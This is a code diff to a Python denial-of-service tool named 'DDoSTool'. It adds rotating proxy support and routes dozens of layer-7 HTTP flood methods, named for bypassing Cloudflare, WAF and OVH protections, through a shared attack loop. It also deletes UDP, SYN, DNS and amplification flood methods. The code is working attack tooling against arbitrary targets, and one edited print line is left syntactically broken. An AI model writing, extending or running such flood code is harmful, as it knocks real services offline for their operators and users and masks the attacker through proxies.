@@ -45,10 +45,19 @@ class DDoSTool:
         self.ssl_context = ssl.create_default_context()
         self.ssl_context.check_hostname = False
         self.ssl_context.verify_mode = ssl.CERT_NONE
+        self.proxies = self.load_proxies()
         
-    def clear_screen(self):
-        os.system('cls' if os.name == 'nt' else 'clear')
-    
+    def load_proxies(self):
+        try:
+            with open('proxy.txt', 'r') as f:
+                return [line.strip() for line in f if line.strip()]
+        except:
+            print(f"{yellow}[!] proxy.txt not found, running without proxies")
+            return []
+
+    def get_random_proxy(self):
+        return random.choice(self.proxies) if self.proxies else None
+
     def generate_cookies(self):
         chars = string.ascii_letters + string.digits
         cf_clearance = ''.join(random.choice(chars) for _ in range(147))
@@ -65,6 +74,31 @@ class DDoSTool:
     
     def strm(self, size):
         return '%0x' % ran(0, 16 ** size)
+
+    # ==================== PROXY CONNECTION HANDLER ====================
+    def create_proxy_socket(self, target, port, proxy):
+        try:
+            if proxy:
+                proxy_host, proxy_port = proxy.split(':')
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((proxy_host, int(proxy_port)))
+                
+                if port == 443:
+                    connect_req = f"CONNECT {target}:{port} HTTP/1.1\r\nHost: {target}:{port}\r\n\r\n"
+                    s.send(connect_req.encode())
+                    response = s.recv(4096)
+                    if b'200' not in response:
+                        raise Exception(f"Proxy connection failed: {response.decode()}")
+                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
+                return s
+            else:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                if port == 443:
+                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
+                s.connect((target, port))
+                return s
+        except Exception as e:
+            return None
 
     def generate_payload_raw(self, target, path):
         return f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.ua.random}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n\r\n".encode()
@@ -171,617 +205,152 @@ class DDoSTool:
 
     def raw(self, target, port, rpc, path):
         payload = self.generate_payload_raw(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def bypass(self, target, port, rpc, path):
         payload = self.generate_payload_bypass(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def mix(self, target, port, rpc, path):
         payload = self.generate_payload_mix(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def cloud(self, target, port, rpc, path):
         payload = self.generate_payload_cloud(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def get(self, target, port, rpc, path):
         payload = self.generate_payload_get(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def uam(self, target, port, rpc, path):
         payload = self.generate_payload_uam(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def waf(self, target, port, rpc, path):
         payload = self.generate_payload_waf(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def ovh(self, target, port, rpc, path):
         payload = self.generate_payload_ovh(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def onec(self, target, port, rpc, path):
         payload = self.generate_payload_onec(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def sky(self, target, port, rpc, path):
         payload = self.generate_payload_sky(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def spoof(self, target, port, rpc, path):
         payload = self.generate_payload_spoof(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def post(self, target, port, rpc, path):
         payload = self.generate_payload_post(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def rawplus(self, target, port, rpc, path):
         payload = self.generate_payload_rawplus(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def high(self, target, port, rpc, path):
         payload = self.generate_payload_high(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def uamplus(self, target, port, rpc, path):
         payload = self.generate_payload_uamplus(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def tls(self, target, port, rpc, path):
         payload = self.generate_payload_tls(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def http2(self, target, port, rpc, path):
         payload = self.generate_payload_http2(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def gurd(self, target, port, rpc, path):
         payload = self.generate_payload_gurd(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def kill(self, target, port, rpc, path):
         payload = self.generate_payload_kill(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def tlsv2(self, target, port, rpc, path):
         payload = self.generate_payload_tlsv2(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def null(self, target, port, rpc, path):
         payload = self.generate_payload_null(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def killplus(self, target, port, rpc, path):
         payload = self.generate_payload_killplus(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def https(self, target, port, rpc, path):
         payload = self.generate_payload_https(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def ir(self, target, port, rpc, path):
         payload = self.generate_payload_ir(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def war(self, target, port, rpc, path):
         payload = self.generate_payload_war(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def warplus(self, target, port, rpc, path):
         payload = self.generate_payload_warplus(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def zeus(self, target, port, rpc, path):
         payload = self.generate_payload_zeus(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def bypassplus(self, target, port, rpc, path):
         payload = self.generate_payload_bypassplus(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def pro(self, target, port, rpc, path):
         payload = self.generate_payload_pro(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def crash(self, target, port, rpc, path):
         payload = self.generate_payload_crash(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def httpsplus(self, target, port, rpc, path):
         payload = self.generate_payload_httpsplus(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def wafplus(self, target, port, rpc, path):
         payload = self.generate_payload_wafplus(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def storm(self, target, port, rpc, path):
         payload = self.generate_payload_storm(target, path)
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
-            except:
-                pass
+        self._execute_attack_with_proxy(target, port, rpc, payload)
 
     def stormplus(self, target, port, rpc, path):
         payload = self.generate_payload_stormplus(target, path)
+        self._execute_attack_with_proxy(target, port, rpc, payload)
+
+    def _execute_attack_with_proxy(self, target, port, rpc, payload):
         while self.running:
+            proxy = self.get_random_proxy()
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                if port == 443:
-                    s = self.ssl_context.wrap_socket(s, server_hostname=target)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(payload)
-                s.close()
+                s = self.create_proxy_socket(target, port, proxy)
+                if s:
+                    for _ in range(rpc):
+                        s.send(payload)
+                    s.close()
             except:
                 pass
-
-    def udp(self, target, port, rpc, _):
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                for _ in range(rpc):
-                    s.sendto(random._urandom(1024), (target, port))
-                s.close()
-            except:
-                pass
-
-    def tcp(self, target, port, rpc, _):
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(random._urandom(1024))
-                s.close()
-            except:
-                pass
-
-    def syn(self, target, port, rpc, _):
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(random._urandom(400))
-                s.close()
-            except:
-                pass
-
-    def icmp(self, target, port, rpc, _):
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                for _ in range(rpc):
-                    s.sendto(random._urandom(3072), (target, port))
-                s.close()
-            except:
-                pass
-
-    def gudp(self, target, port, rpc, _):
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                for _ in range(rpc):
-                    s.sendto(random._urandom(random.randint(512, 1024)), (target, port))
-                s.close()
-            except:
-                pass
-
-    def udpplus(self, target, port, rpc, _):
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                for _ in range(rpc):
-                    s.sendto(random._urandom(800), (target, port))
-                s.close()
-            except:
-                pass
-
-    def dns(self, target, port, rpc, _):
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                for _ in range(rpc):
-                    s.sendto(random._urandom(23445), (target, port))
-                s.close()
-            except:
-                pass
-
-    def amp(self, target, port, rpc, _):
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                for _ in range(rpc):
-                    s.sendto(random._urandom(5617), (target, port))
-                s.close()
-            except:
-                pass
-
-    def flood(self, target, port, rpc, _):
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                for _ in range(rpc):
-                    s.sendto(random._urandom(22065), (target, port))
-                s.close()
-            except:
-                pass
-
-    def handshake(self, target, port, rpc, _):
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((target, port))
-                for _ in range(rpc):
-                    s.send(random._urandom(random.randint(512, 1024)))
-                s.close()
-            except:
-                pass
-
-    def byudp(self, target, port, rpc, _):
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                for _ in range(rpc):
-                    s.send(random._urandom(512))
-                s.close()
-            except:
-                pass
-
-    def rdp(self, target, port, rpc, _):
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                for _ in range(rpc):
-                    s.send(b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00' + random._urandom(22065))
-                s.close()
-            except:
-                pass
-
-    def craft(self, target, port, rpc, _):
-        while self.running:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
-                         b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
-                         b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
-                         b'\x73')
-                for _ in range(rpc):
-                    s.sendto(payload, (target, port))
-                s.close()
-            except:
-                pass
-
+                
     def start_attack(self, attack_type, method, target, port, threads, rpc, duration):
         methods = {
             'layer7': {
@@ -819,21 +388,6 @@ class DDoSTool:
                 'waf+': self.wafplus,
                 'storm': self.storm,
                 'storm+': self.stormplus
-            },
-            'layer4': {
-                'udp': self.udp,
-                'tcp': self.tcp,
-                'syn': self.syn,
-                'icmp': self.icmp,
-                'gudp': self.gudp,
-                'udp+': self.udpplus,
-                'dns': self.dns,
-                'amp': self.amp,
-                'flood': self.flood,
-                'hand': self.handshake,
-                'byudp': self.byudp,
-                'rdp': self.rdp,
-                'craft': self.craft
             }
         }
         
@@ -916,27 +470,6 @@ def show_layer7_banner():
 ╚════════════════════════════════════════════════════════════════════════╝
 """)
 
-def show_layer4_banner():
-    print(f"""{cyan}
-╔════════════════════════════════════════════════════════════════════════╗
-║ {red}• {cyan}Layer{red}4 {blue}Methods: {magenta}                                                     {cyan}║
-║                                                                        ║
-║ {red}UDP    {cyan}( {green}Send UDP packet to server {cyan}){yellow}                                   ║
-║ {red}TCP    {cyan}( {green}Send TCP packet to server {cyan}){yellow}                                   ║
-║ {red}SYN    {cyan}( {green}Send SYN packet to server {cyan}){yellow}                                   ║
-║ {red}ICMP   {cyan}( {green}Send ICMP packet to server {cyan}){yellow}                                  ║
-║ {red}GUDP   {cyan}( {green}Send GUDP packet to server {cyan}){yellow}                                  ║
-║ {red}UDP+   {cyan}( {green}Send UDP packet to server {red}+ {cyan}){yellow}                                 ║
-║ {red}DNS    {cyan}( {green}DNS amplification attack {cyan}){yellow}                                    ║
-║ {red}AMP    {cyan}( {green}CharGEN amplification attack {cyan}){yellow}                                ║
-║ {red}FLOOD  {cyan}( {green}OVH SERVER UDP FLOOD {cyan}){yellow}                                        ║
-║ {red}HAND   {cyan}( {green}TCP HANDSHAKE FLOOD {cyan}){yellow}                                         ║
-║ {red}RDP    {cyan}( {green}UDP FLOOD ON RDP VPS {cyan}){yellow}                                        ║
-║ {red}CRAFT  {cyan}( {green}Minecraft SERVER ATTACK {cyan}){yellow}                                     ║
-║ {red}Note {cyan}: {green}CTRL+Z to exit{yellow}                                                  ║
-╚════════════════════════════════════════════════════════════════════════╝
-""")
-
 def logo():
     print(f"""{red}
     ██████╗ ███████╗██████╗ ██╗   ██╗██╗███████╗
@@ -962,12 +495,8 @@ def get_input():
             show_layer7_banner()
             layer = 'layer7'
             break
-        elif layer in ['layer4', 'l4']:
-            show_layer4_banner()
-            layer = 'layer4'
-            break
         else:
-            print(f"{red}[!] Invalid layer! Please enter 'layer7' or 'layer4'")
+            print(f"{red}[!] Invalid layer! Please enter 'layer7')
 
     method = input("Enter attack method: ")
     target = input("Enter target IP/hostname: ")
